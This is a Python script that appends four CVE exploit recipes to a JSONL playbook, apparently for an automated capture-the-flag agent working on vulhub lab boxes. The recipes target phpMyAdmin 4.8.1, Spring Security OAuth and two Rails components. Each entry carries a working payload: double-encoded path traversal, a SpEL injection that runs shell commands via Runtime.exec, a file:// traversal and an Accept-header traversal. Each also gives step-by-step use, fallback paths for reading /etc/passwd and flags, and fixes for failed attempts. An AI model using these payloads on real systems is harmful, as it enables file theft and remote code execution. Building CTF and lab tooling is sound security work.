"""One-off writer that appends the vulhub high-frequency CVE recipes.

Every entry is bound to its CVE id: ``known_exploit`` refuses to surface one
unless the Challenge declares that id, so a recipe can never leak into a box it
does not describe.
"""

import json
from pathlib import Path

PLAYBOOK = Path(__file__).resolve().parents[1] / "data" / "knowledge" / "cve-playbook.jsonl"

ENTRIES = [
    {
        "id": "cve-2018-12613-phpmyadmin-lfi",
        "kind": "poc",
        "title": "phpMyAdmin 4.8.1 index.php target 参数本地文件包含 (CVE-2018-12613)",
        "technique": "double-urldecoded `target` parameter path traversal (LFI)",
        "summary": (
            "phpMyAdmin 4.8.1 的 index.php 用 `target` 参数选择要包含的 PHP 文件，"
            "白名单检查在 `Core::securePath()` 里只挡了 `..` 与非法字符，但 `target` 值"
            "在拼接前被 urldecode 了两次：提交 `%253f` 先变成字面量 `%3f`，再过一次解码"
            "成为 `?`，于是 `target=db_sql.php?/../../../../flag` 变成一个合法白名单前缀"
            "加路径穿越。攻击面是首页 `/index.php` 的 `target` 参数，不需要登录。"
        ),
        "preconditions": [
            "目标为 phpMyAdmin 4.8.1（响应头常带 X-Powered-By: PHP/7.2.x）",
            "能向 /index.php 发送带 target 参数的 GET",
            "不需要认证：该 LFI 在登录前即可触发",
        ],
        "target_stack": [
            "phpMyAdmin 4.8.1",
            "CVE-2018-12613",
            "PHP",
            "LFI",
        ],
        "payload_template": (
            "GET /index.php?target=db_sql.php%253f/../../../../../../flag HTTP/1.1\n"
            "Host: TARGET\n"
            "Connection: close\n"
            "\n"
        ),
        "verification_method": [
            "响应体里直接出现 flag 明文（BANNER{...}）即成功",
            "先用 `?target=db_sql.php%253f/../../../../../../etc/passwd` 验证穿越成立：能读到 passwd 说明路径解析绕过成功，再把尾巴换成 /flag",
            "若 /flag 不存在，依次试 /flag.txt、/root/flag、/tmp/flag、/var/www/html/flag",
        ],
        "known_failures": [
            "不要用单次编码 `%3f`：`?` 会提前把 target 截断，白名单检查直接拒绝，表现为 200 但返回登录页",
            "不要试图登录后台再找 flag：config auth 模式下本来就没有可用口令，LFI 是唯一入口",
            "不要枚举 /themes、/js、/libraries 的目录列表：它们固定 403，与本 CVE 无关，整轮都问不出东西",
            "flag 不一定在 /flag：本环境是容器，先读 /etc/passwd 确认穿越成功，再按 verification_method 的顺序试常见位置",
        ],
        "steps": [
            "GET /index.php?target=db_sql.php%253f/../../../../../../etc/passwd 确认穿越成立",
            "同一 payload 把尾巴换成 /flag（按顺序试 /flag、/flag.txt、/root/flag）",
            "在响应体里找 flag 形状的串，原样写成 FOUND_FLAG=",
        ],
        "provenance": {
            "source_type": "reference-corpus",
            "source_ref": "cve-playbook",
            "source_url": "https://github.com/vulhub/vulhub/tree/master/phpmyadmin/CVE-2018-12613",
            "notes": "攻击面绑定：仅当题目点名 CVE-2018-12613 或 phpMyAdmin 4.8.1 时才是先验。",
        },
        "trust_level": "unverified",
    },
    {
        "id": "cve-2016-4977-spring-oauth-spel-rce",
        "kind": "poc",
        "title": "Spring Security OAuth response_type SpEL 注入 RCE (CVE-2016-4977)",
        "technique": "SpEL injection in /oauth/authorize response_type",
        "summary": (
            "Spring Security OAuth 2.0.0-2.0.9 / 1.0.0-1.0.4 的 `/oauth/authorize` 把 "
            "`response_type` 参数拼进 SpEL 表达式求值，攻击者提交 `${...}` 即可执行 Java "
            "代码。攻击面是 `/oauth/authorize` 的 query 参数，不是登录页也不是 actuator。"
        ),
        "preconditions": [
            "目标存在 /oauth/authorize 端点（返回 400 或跳转即说明存在）",
            "能控制 response_type 参数（需 URL 编码 ${} 为 %24%7b...%7d）",
            "client_id 必须是已注册客户端；vulhub 环境常用 acme，错误列表页会给出合法 client_id",
        ],
        "target_stack": [
            "Spring Security OAuth",
            "CVE-2016-4977",
            "SpEL",
            "Java",
        ],
        "payload_template": (
            "GET /oauth/authorize?response_type=%24%7bT%28org.apache.commons.io.IOUtils%29"
            ".toString%28T%28java.lang.Runtime%29.getRuntime%28%29.exec%28%22cat%20/flag%22%29"
            ".getInputStream%28%29%29%7d&client_id=acme&scope=openid"
            "&redirect_uri=http://localhost:8080 HTTP/1.1\n"
            "Host: TARGET\n"
            "Connection: close\n"
            "\n"
        ),
        "verification_method": [
            "响应体（通常是 Whitelabel Error 页或 400 详情）里出现 flag 明文",
            "若 commons-io 不在 classpath，改用 Scanner 读文件版本：%24%7bnew%20java.lang.String%28new%20java.util.Scanner%28new%20java.io.FileInputStream%28new%20java.io.File%28%22/flag%22%29%29%29.useDelimiter%28%22%5C%5CA%22%29.next%28%29%7d",
            "先用 exec(\"id\") 把命令输出回显一次，确认 SpEL 确实求值，再换成 cat /flag",
        ],
        "known_failures": [
            "命令执行本身不回显：exec 的返回值是 Process 对象，toString 只会打印对象地址，必须像 payload 那样取 getInputStream() 再 toString",
            "不要裸提交 `${...}`：花括号不编码会被容器提前截断/400，必须 %24%7b 与 %7d",
            "client_id 随便填会先被 OAuth 校验挡下并返回 JSON 错误，此时改从该错误里拿合法 client_id（vulhub 常用 acme）",
        ],
        "steps": [
            "GET /oauth/authorize?response_type=token&client_id=acme&scope=openid&redirect_uri=http://localhost:8080 确认端点与 client_id 合法",
            "把 response_type 换成 %24%7b...exec(\"id\")...%7d 的 SpEL，确认回显",
            "把命令换成 cat /flag（或 /flag.txt），从响应体取 flag",
        ],
        "provenance": {
            "source_type": "reference-corpus",
            "source_ref": "cve-playbook",
            "source_url": "https://github.com/vulhub/vulhub/tree/master/spring/CVE-2016-4977",
            "notes": "攻击面绑定：仅当题目点名 CVE-2016-4977 或 Spring Security OAuth 时才是先验。",
        },
        "trust_level": "unverified",
    },
    {
        "id": "cve-2018-3760-rails-sprockets-lfi",
        "kind": "poc",
        "title": "Rails Sprockets 任意文件读取 (CVE-2018-3760)",
        "technique": "`file://` scheme in /assets/ path bypassing path whitelist",
        "summary": (
            "Rails 4.x 的 Sprockets 在开发模式下处理 `/assets/file:%2f%2f<path>` 时接受 "
            "`file://` 协议，且白名单只校验字符串前缀，可以用 `%2e%2e` 穿越出去读任意文件。"
            "攻击面是 `/assets/` 静态资源路由，不是控制器。"
        ),
        "preconditions": [
            "目标为 Rails 且 /assets 路由可访问（返回 200 或 404 均可，别是 403）",
            "应用启用了 Sprockets 的 file:// 读取（vulhub 默认开启）",
        ],
        "target_stack": [
            "Ruby on Rails",
            "Sprockets",
            "CVE-2018-3760",
        ],
        "payload_template": (
            "GET /assets/file:%2f%2f/etc/passwd HTTP/1.1\n"
            "Host: TARGET\n"
            "Connection: close\n"
            "\n"
        ),
        "verification_method": [
            "第一次请求通常返回 500/404 且错误信息里列出 allowed 目录（这是有用的信息，不是失败）",
            "把 payload 改成 allowed 目录 + %2e%2e 穿越：/assets/file:%2f%2f<allowed_dir>/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
            "能读到 passwd 后把尾巴换成 /flag（vulhub 该环境 flag 常在 /flag）",
        ],
        "known_failures": [
            "直接 `file:%2f%2f/etc/passwd` 常被白名单拒，必须带一个 allowed 前缀再穿越，否则只会看到 500 但没有任何内容",
            "不要用 `../` 字面量：Rails 路由会把 `.` 规范化掉，必须用 `%2e%2e`",
            "不要枚举 /assets 目录：Sprockets 不给 listing，浪费窗口",
        ],
        "steps": [
            "GET /assets/file:%2f%2f/etc/passwd 读错误页里的 allowed 目录",
            "用该目录 + %2e%2e 穿越到 /etc/passwd 确认可读",
            "尾巴换 /flag 取 flag",
        ],
        "provenance": {
            "source_type": "reference-corpus",
            "source_ref": "cve-playbook",
            "source_url": "https://github.com/vulhub/vulhub/tree/master/rails/CVE-2018-3760",
            "notes": "攻击面绑定：仅当题目点名 CVE-2018-3760 或 Rails Sprockets 时才是先验。",
        },
        "trust_level": "unverified",
    },
    {
        "id": "cve-2019-5418-rails-actionview-lfi",
        "kind": "poc",
        "title": "Rails ActionView Accept 头路径穿越文件读取 (CVE-2019-5418)",
        "technique": "`Accept` header rendered as template path (render file:)",
        "summary": (
            "Rails 5.2.1 之前，ActionView 的 `render file:` 会直接采用请求的 `Accept` 头"
            "去拼模板路径，提交 `../../../../../../etc/passwd{{` 即可让模板引擎读任意文件。"
            "攻击面是任意会渲染视图的路由（vulhub 用首页 `/`），载体是 HTTP 头而不是 URL。"
        ),
        "preconditions": [
            "目标为受影响 Rails（/ 返回 200 且是 HTML 页面）",
            "能自定义 Accept 请求头（curl -H 即可）",
        ],
        "target_stack": [
            "Ruby on Rails",
            "ActionView",
            "CVE-2019-5418",
        ],
        "payload_template": (
            "GET / HTTP/1.1\n"
            "Host: TARGET\n"
            "Accept: ../../../../../../etc/passwd{{\n"
            "Connection: close\n"
            "\n"
        ),
        "verification_method": [
            "响应体里出现 passwd 内容即穿越成立",
            "把 Accept 换成 `../../../../../../flag{{` 直接读 flag",
            "末尾的 `{{` 不能省：它让文件被当作 ERB 模板解析，缺了就只报模板不存在",
        ],
        "known_failures": [
            "穷举 URL 路径没有意义：这个洞在 Accept 头，URL 保持 `/` 即可",
            "忘了 `{{` 会得到 500 `Missing template`，看起来像失败其实只是少了两个花括号",
            "不要用 `../` 百分号编码：Accept 头不做 URL 解码，原样提交点斜线",
        ],
        "steps": [
            "GET / 且 Accept: ../../../../../../etc/passwd{{ 确认可读",
            "Accept 换成 ../../../../../../flag{{ 取 flag",
            "在响应体里找 flag 形状的串，写成 FOUND_FLAG=",
        ],
        "provenance": {
            "source_type": "reference-corpus",
            "source_ref": "cve-playbook",
            "source_url": "https://github.com/vulhub/vulhub/tree/master/rails/CVE-2019-5418",
            "notes": "攻击面绑定：仅当题目点名 CVE-2019-5418 或 Rails ActionView 时才是先验。",
        },
        "trust_level": "unverified",
    },
]


def main() -> None:
    existing = set()
    for line in PLAYBOOK.read_text(encoding="utf-8").splitlines():
        line = line.strip()
        if not line:
            continue
        existing.add(json.loads(line)["id"])
    added = 0
    with PLAYBOOK.open("a", encoding="utf-8") as handle:
        for entry in ENTRIES:
            if entry["id"] in existing:
                print(f"skip (already present): {entry['id']}")
                continue
            handle.write(json.dumps(entry, ensure_ascii=False) + "\n")
            added += 1
            print(f"added: {entry['id']}")
    print(f"total added: {added}")


if __name__ == "__main__":
    main()
